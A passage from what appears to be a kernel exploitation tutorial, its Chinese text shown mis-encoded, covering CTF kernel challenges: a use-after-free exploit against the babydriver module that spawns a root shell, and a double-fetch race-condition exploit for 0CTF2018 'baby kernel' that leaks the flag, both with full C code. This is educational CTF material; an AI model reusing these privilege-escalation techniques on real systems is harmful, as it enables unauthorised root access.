class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æœ¬åœ°æ‰“åŒ…ï¼Œè¿è¡Œï¼ŒæˆåŠŸææƒåˆ°root</p>
<p><img src="https://i.loli.net/2021/03/16/b31pgOZQydFAEoM.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>è¿™é“é¢˜åœ¨å½“å¹´çš„è§£æ³•æ®æ‚‰æ˜¯<strong>é€šè¿‡ UAF ä¿®æ”¹è¯¥è¿›ç¨‹çš„ cred ç»“æ„ä½“çš„ uidã€gid ä¸º0</strong>ï¼Œååˆ†ç®€å•ååˆ†ç™½ç»™</p>
<p>ä½†æ˜¯<strong>æ­¤ç§æ–¹æ³•åœ¨è¾ƒæ–°ç‰ˆæœ¬ kernel ä¸­å·²ä¸å¯è¡Œï¼Œæˆ‘ä»¬å·²æ— æ³•ç›´æ¥åˆ†é…åˆ° cred_jar ä¸­çš„ object</strong>ï¼Œè¿™æ˜¯å› ä¸º cred_jar åœ¨åˆ›å»ºæ—¶è®¾ç½®äº† <code>SLAB_ACCOUNT</code> æ ‡è®°ï¼Œåœ¨ <code>CONFIG_MEMCG_KMEM=y</code> æ—¶ï¼ˆé»˜è®¤å¼€å¯ï¼‰<strong>cred_jar ä¸ä¼šå†ä¸ç›¸åŒå¤§å°çš„ kmalloc-192 è¿›è¡Œåˆå¹¶</strong></p>
<blockquote>
<p>æ¥ç€å†…æ ¸æºç  4.5 <code>kernel/cred.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __init <span class="hljs-title function_">cred_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>	cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred), <span class="hljs-number">0</span>,<br>			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æœ¬é¢˜ï¼ˆ4.4.72ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __init <span class="hljs-title function_">cred_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>	cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred),<br>				     <span class="hljs-number">0</span>, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>æ—¢ç„¶ç°åœ¨æ–°çš„ä¿æŠ¤æœºåˆ¶éƒ½å‡ºæ¥äº†ï¼Œé‚£ç¬”è€…è®¤ä¸ºåœ¨å­¦ä¹  kernel UAF çš„è¿‡ç¨‹ä¸­å¿½è§†æ‰è¿™ä¸€ç‚¹ä¾¿æ˜¯<strong>è‡ªæ¬ºæ¬ºäºº</strong>ï¼ˆè€Œä¸”è¿™ä¸ªè§£æ³•<strong>å¤ªå¼±æ™ºäº†ï¼Œå®Œå…¨æ²¡æœ‰å­¦çš„æ„ä¹‰</strong> -  - ï¼‰ï¼Œæ•…è¿™é‡Œä¾¿<strong>ä¸å†è€ƒè™‘</strong>ä»¥å‰æ—§çš„åšæ³•ï¼Œæ„Ÿå…´è¶£çš„å‚è€ƒå¦‚ä¸‹expï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br><br>    <span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0xa8</span>);<br>    close(fd1);<br><br>    <span class="hljs-type">int</span> pid = fork();<br><br>    <span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Unable to fork the new thread, exploit failed.\033[0m\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>) <span class="hljs-comment">// the child thread</span><br>    &#123;<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        write(fd2, buf, <span class="hljs-number">28</span>);<br><br>        <span class="hljs-keyword">if</span>(getuid() == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>            system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Unable to get the root, exploit failed.\033[0m\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">// the parent thread</span><br>    &#123;<br>        wait(<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//waiting for the child</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<h1 id="0x05-æ¡ä»¶ç«äº‰ï¼ˆRace-conditionï¼‰"><a href="#0x05-æ¡ä»¶ç«äº‰ï¼ˆRace-conditionï¼‰" class="headerlink" title="0x05.æ¡ä»¶ç«äº‰ï¼ˆRace conditionï¼‰"></a>0x05.æ¡ä»¶ç«äº‰ï¼ˆRace conditionï¼‰</h1><p>é€šå¸¸æƒ…å†µä¸‹åœ¨ç”¨æˆ·æ€ä¸‹çš„ pwn å½“ä¸­æˆ‘ä»¬åªæœ‰ä¸€ä¸ªç‹¬ç«‹è¿è¡Œçš„ä¸»çº¿ç¨‹ï¼Œå¹¶ä¸å­˜åœ¨æ‰€è°“æ¡ä»¶ç«äº‰çš„æƒ…å†µï¼Œä½†åœ¨ kernel pwn å½“ä¸­<strong>ç”±æ”»å‡»è€…è´Ÿè´£ç¼–å†™ç”¨æˆ·æ€ç¨‹åºï¼Œå¯ä»¥å¾ˆè½»æ˜“åœ°å¯åŠ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶è¿è¡Œ</strong>ï¼Œä»è€Œè½»æ˜“åœ°äº§ç”Ÿæ¡ä»¶ç«äº‰</p>
<blockquote>
<p>ä¸è¿‡è¿‘å¹´æ¥éšç€ glibc heap pwn çš„å¥—è·¯é€æ¸æŒ–æ˜æ®†å°½ï¼Œç”¨æˆ·æ€ä¸‹çš„ pwn é¢˜ä¹Ÿå¼€å§‹é€æ¸è„±ç¦» glibc æœ¬èº«çš„åˆ©ç”¨è€Œå‘å¤šä¸ªå…¶ä»–æ–¹å‘å‘å±•ï¼Œå…¶ä¸­ä¸€ä¸ªçƒ­é—¨æ–¹å‘ä¾¿æ˜¯ç”¨æˆ·æ€ä¸‹å¤šçº¿ç¨‹é€ æˆæ¡ä»¶ç«äº‰</p>
<blockquote>
<p>è¿˜æœ‰ä¸€ä¸ªé€æ¸çƒ­é—¨çš„æ–¹å‘ä¾¿æ˜¯ musl C å †åˆ©ç”¨</p>
</blockquote>
</blockquote>
<h2 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h2><p><code>double fetch</code> ç›´è¯‘å°±æ˜¯ <code>å–å€¼ä¸¤æ¬¡</code>ï¼Œç›´æ¥ç†è§£å°±æ˜¯åœ¨ä¸€æ¬¡æ“ä½œå½“ä¸­è¦<strong>ä¸¤æ¬¡ï¼ˆæˆ–æ˜¯å¤šæ¬¡ï¼‰é‡æ–°è·å–æŸä¸ªå¯¹è±¡çš„å€¼</strong>ï¼Œå¯èƒ½å‡ºç°åœ¨ä¸‹é¢è¿™ç§æƒ…å†µå½“ä¸­ï¼š</p>
<ul>
<li>æœ‰ä¸€å¤§æ®µæ•°æ®è¦ä»ç”¨æˆ·ç©ºé—´ä¼ ç»™å†…æ ¸ç©ºé—´ï¼Œä½†æ˜¯ç›´æ¥ä¼ é€æ•´å—æ•°æ®ä¼šé€ æˆè¾ƒå¤§çš„å¼€é”€ï¼Œæ•…é€‰æ‹©<strong>åªå‘å†…æ ¸ä¼ é€ä¸€ä¸ªæŒ‡å‘ç”¨æˆ·åœ°å€ç©ºé—´çš„æŒ‡é’ˆ</strong></li>
<li>åœ¨åç»­çš„æ“ä½œå½“ä¸­å†…æ ¸éœ€è¦<strong>å¤šæ¬¡</strong>é€šè¿‡è¯¥æŒ‡é’ˆè·å–åˆ°ç”¨æˆ·ç©ºé—´çš„æ•°æ®</li>
</ul>
<p>ä¾‹å¦‚ï¼šå†…æ ¸ç¬¬ä¸€æ¬¡å…ˆè·å–æ•°æ®è¿›è¡Œåˆæ³•æ€§éªŒè¯ï¼Œç¬¬äºŒæ¬¡å†è·å–æ•°æ®è¿›è¡Œä½¿ç”¨ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰</p>
<p><img src="https://i.loli.net/2021/09/08/pqLSVaINQ3zAsmO.png" srcset="/img/loading.gif" lazyload></p>
<p>ä¸éš¾çœ‹å‡ºï¼Œè‹¥æ˜¯æ•´ä¸ªæ“ä½œæµç¨‹è¿‡é•¿ï¼Œåˆ™ç”¨æˆ·è¿›ç¨‹ä¾¿æœ‰æœºä¼šä¿®æ”¹è¿™ä¸€å—æ•°æ®ï¼Œ<strong>ä½¿å¾—å†…æ ¸åœ¨ä¸¤æ¬¡è®¿é—®è¿™å—ç©ºé—´æ—¶æ‰€è·å¾—çš„æ•°æ®ä¸ä¸€è‡´ï¼Œä»è€Œä½¿å¾—å†…æ ¸è¿›å…¥ä¸åŒçš„æ‰§è¡Œæµç¨‹</strong>ï¼Œç”¨æˆ·è¿›ç¨‹ç”šè‡³å¯ä»¥<strong>ç›´æ¥å¼€æ–°çš„çº¿ç¨‹è¿›è¡Œç«äº‰æ¥å®ç°è¿™ä¸ªæ•ˆæœ</strong></p>
<p><img src="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png" srcset="/img/loading.gif" lazyload></p>
<p>é€šè¿‡åœ¨ first fetch ä¸ second fetch ä¹‹é—´çš„ç©ºæŒ¡ä¿®æ”¹æ•°æ®ä»è€Œæ”¹å˜å†…æ ¸æ‰§è¡Œæµçš„åˆ©ç”¨æ‰‹æ³•ä¾¿è¢«ç§°ä¹‹ä¸º<code>double fetch</code></p>
<h3 id="ä¾‹é¢˜ï¼š0CTF2018-Final-baby-kernel"><a href="#ä¾‹é¢˜ï¼š0CTF2018-Final-baby-kernel" class="headerlink" title="ä¾‹é¢˜ï¼š0CTF2018 Final - baby kernel"></a>ä¾‹é¢˜ï¼š0CTF2018 Final - baby kernel</h3><h4 id="â‘ -åˆ†æ-2"><a href="#â‘ -åˆ†æ-2" class="headerlink" title="â‘  åˆ†æ"></a>â‘  åˆ†æ</h4><p>é¦–å…ˆæŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼ŒåŸºæœ¬æ²¡å¼€é¢å¤–çš„ä¿æŠ¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 \<br>-m 256M -smp 2,cores=2,threads=1  \<br>-kernel ./vmlinuz-4.15.0-22-generic \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot;</span> \<br>-cpu qemu64 \<br>-netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure>

<p>è§£å‹æ–‡ä»¶ç³»ç»Ÿï¼Œå‘ç°å¯ç–‘é©±åŠ¨æ–‡ä»¶ <code>baby.ko</code>ï¼Œæƒ¯ä¾‹åœ° <code>checksec</code>ï¼Œåªå¼€äº† NX</p>
<p><img src="https://i.loli.net/2021/09/07/HkD2ygAPvb9BMSu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œåªç®€å•åœ°å®šä¹‰äº†ä¸€ä¸ª ioctl</p>
<p><img src="https://i.loli.net/2021/09/07/Czo7jDP5YyXUKhr.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å…¶ä¸­å‚æ•° <code>0x6666</code> å¯ä»¥è·å¾— flag åœ¨å†…æ ¸ä¸­çš„åœ°å€ï¼Œå‚æ•° <code>0x1337</code> åˆ™ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„ flag ä¸çœŸæ­£çš„ flag è¿›è¡Œå¯¹æ¯”ï¼Œè‹¥æ­£ç¡®åˆ™ä¼šå°† flag æ‰“å°å‡ºæ¥</p>
<p>æµ‹è¯•ä¸€ä¸‹ï¼Œ<code>dmesg</code> æƒé™å¼€äº†ï¼Œæ•´æŒºå¥½</p>
<p><img src="https://i.loli.net/2021/09/08/Q8Hyg4jGnSok2tW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç®€å•åˆ†æå¯çŸ¥æˆ‘ä»¬åº”å½“ä¼ å…¥å¦‚ä¸‹ç»“æ„ä½“ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flag</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­ <code>flag_len</code> å‚æ•°ä¸ flag çš„é•¿åº¦å¯¹æ¯”ï¼Œåœ¨ .ko æ–‡ä»¶ä¸­ flag çš„é•¿åº¦ä¸º 33</p>
<p>åœ¨ <code>0x1337</code> åŠŸèƒ½å½“ä¸­è¿˜ä¼šé€šè¿‡ <code>_chk_range_not_ok()</code> å‡½æ•°æ£€æŸ¥æˆ‘ä»¬ä¼ å…¥çš„åœ°å€èŒƒå›´æ˜¯å¦åˆæ³•ï¼š</p>
<p><img src="https://i.loli.net/2021/09/08/QjFdxAHLOTkctUB.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>add æŒ‡ä»¤ä¼šå½±å“ CFï¼ˆäº§ç”Ÿè¿›ä½&#x2F;å€Ÿä½ï¼‰å’Œ OFï¼ˆä¸¤æ•°æœ€é«˜ä½ç›¸åŒï¼Œç»“æœæœ€é«˜ä½æ”¹å˜ï¼‰æ ‡å¿—ä½ï¼Œv3è·å¾—çš„å°±æ˜¯ä¸¤æ•°ç›¸åŠ çš„ CF ä½ï¼Œè¿™é‡Œä¸€èˆ¬ä¸º0ï¼ˆé™¤éä½ ä¼ å…¥ <code>0xffffffffffffffff</code> é™„è¿‘çš„æ•°ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹å¦ä¸€ä¸ªåˆ¤æ–­ï¼ša3 æ˜¯å¦å°äº v4</p>
<p>a3 ä¸º current_task çš„åœ°å€åŠ ä¸Š 0x1358 å¤„æ‰€å­˜åœ°å€ï¼Œå¤§æ¦‚æ˜¯ <code>task_struct-&gt;thread-&gt;fpu-&gt;state</code> è¿™ä¸ªè”åˆä½“å†…çš„æŸä¸ªä½ç½®ä¸Šå­˜çš„ä¸€ä¸ªå€¼ï¼Œè€Œ v4 åˆ™æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ flag æœ€åä¸€ä¸ªå­—èŠ‚çš„åœ°å€ï¼Œå³æˆ‘ä»¬ä¼ å…¥çš„ flag çš„åœ°å€ä¸èƒ½å¤Ÿå¤§äºè¿™ä¸ªå€¼</p>
<p>åˆ‡ root è°ƒä¸€ä¸‹æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªå€¼ä¸º <code>0x7ffffffff000</code></p>
<p><img src="https://i.loli.net/2021/09/08/WFU9rzp1vSaR3hP.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è¿™ä¸ªä½ç½®åˆšå¥½æ˜¯ç”¨æˆ·åœ°å€ç©ºé—´çš„æ ˆåº•ï¼Œå³æˆ‘ä»¬ä¼ å…¥çš„ flag çš„åœ°å€ä¸èƒ½ä¸ºç”¨æˆ·åœ°å€ç©ºé—´å¤–çš„åœ°å€</p>
<p><img src="https://i.loli.net/2021/09/08/tJ7uiEhCG4acbsd.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="â‘¡-åˆ©ç”¨"><a href="#â‘¡-åˆ©ç”¨" class="headerlink" title="â‘¡ åˆ©ç”¨"></a>â‘¡ åˆ©ç”¨</h4><p>è™½ç„¶ flag å­˜å‚¨çš„åœ°å€å·²çŸ¥ï¼Œä½†æ˜¯ä½äºå†…æ ¸åœ°å€ç©ºé—´å½“ä¸­ï¼Œæˆ‘ä»¬å°†ä¹‹ç›´æ¥ä¼ ç»™æ¨¡å—å¹¶ä¸èƒ½é€šè¿‡éªŒè¯ï¼Œé‚£ä¹ˆè¿™é‡Œå°±è€ƒè™‘ double fetchâ€”â€”å…ˆä¼ å…¥ä¸€ä¸ªç”¨æˆ·åœ°å€ç©ºé—´ä¸Šçš„åˆæ³•åœ°å€ï¼Œå¼€å¦ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œç«äº‰ä¸æ–­ä¿®æ”¹å…¶ä¸ºå†…æ ¸ç©ºé—´ flag çš„åœ°å€ï¼Œåªè¦æœ‰ä¸€æ¬¡å‘½ä¸­æˆ‘ä»¬ä¾¿èƒ½è·å¾— flag</p>
<p><img src="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="â‘¢-final-exploit-1"><a href="#â‘¢-final-exploit-1" class="headerlink" title="â‘¢ final exploit"></a>â‘¢ final exploit</h4><p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">pthread_t</span> compete_thread;<br><span class="hljs-type">void</span> * real_addr;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x20</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>;<br><span class="hljs-type">int</span> competetion_times = <span class="hljs-number">0x1000</span>, status = <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;flag = &#123;.flag_addr = buf, .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">competetionThread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (status)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; competetion_times; i++)<br>            flag.flag_addr = real_addr;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd, result_fd, addr_fd;<br>    <span class="hljs-type">char</span> * temp, *flag_addr_addr;<br><br>    fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br>    ioctl(fd, <span class="hljs-number">0x6666</span>);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag &gt; addr.txt&quot;</span>);<br>    temp = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);    <br>    addr_fd = open(<span class="hljs-string">&quot;./addr.txt&quot;</span>, O_RDONLY);<br>    temp[read(addr_fd, temp, <span class="hljs-number">0x100</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    flag_addr_addr = <span class="hljs-built_in">strstr</span>(temp, <span class="hljs-string">&quot;Your flag is at &quot;</span>) + <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Your flag is at &quot;</span>);<br>    real_addr = strtoull(flag_addr_addr, flag_addr_addr + <span class="hljs-number">16</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] flag addr: %llx&quot;</span>, real_addr);<br><br>    pthread_create(&amp;compete_thread, <span class="hljs-literal">NULL</span>, competetionThread, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (status)<br>    &#123;    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; competetion_times; i++)<br>        &#123;<br>            flag.flag_addr = buf;<br>            ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br>        &#125;<br>        system(<span class="hljs-string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);<br>        result_fd = open(<span class="hljs-string">&quot;./result.txt&quot;</span>, O_RDONLY);<br>        read(result_fd, temp, <span class="hljs-number">0x1000</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(temp, <span class="hljs-string">&quot;flag&#123;&quot;</span>))<br>            status = <span class="hljs-number">0</span>;<br>    &#125;<br>    pthread_cancel(compete_thread);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] competetion end!&quot;</span>);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾— flag</p>
<p><img src="https://i.loli.net/2021/09/08/NIrbAYh8UklgEsc.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>ç¬”è€…åŸæœ¬æƒ³ç”¨ fscanf è¯»å…¥ flag åœ°å€ï¼Œä½†æ˜¯ä¸æ˜åŸå› ä¸€ç›´ä¸èƒ½æˆåŠŸï¼Œç„¶ååˆæ¢äº† sscanf ä¹Ÿä¸èƒ½æˆåŠŸâ€¦æœ€ååªå¥½æ¢äº† strtoull â€¦</p>
</blockquote>
<blockquote>
<h4 id="extraï¼šæµ‹ä¿¡é“æ”»å‡»"><a href="#extraï¼šæµ‹ä¿¡é“æ”»å‡»" class="headerlink" title="extraï¼šæµ‹ä¿¡é“æ”»å‡»"></a>extraï¼šæµ‹ä¿¡é“æ”»å‡»</h4><p>åœ¨è¿›è¡Œæ¯”å¯¹æ—¶å¹¶æ²¡æœ‰æ£€éªŒ flag åœ°å€çš„åˆæ³•æ€§ï¼Œè€ƒè™‘å¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">|                              |    &lt;---- unallocated page</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |    &lt;---- page alloc by mmap</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                     flag&#123;...X|</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |    &lt;---- unallocated page</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

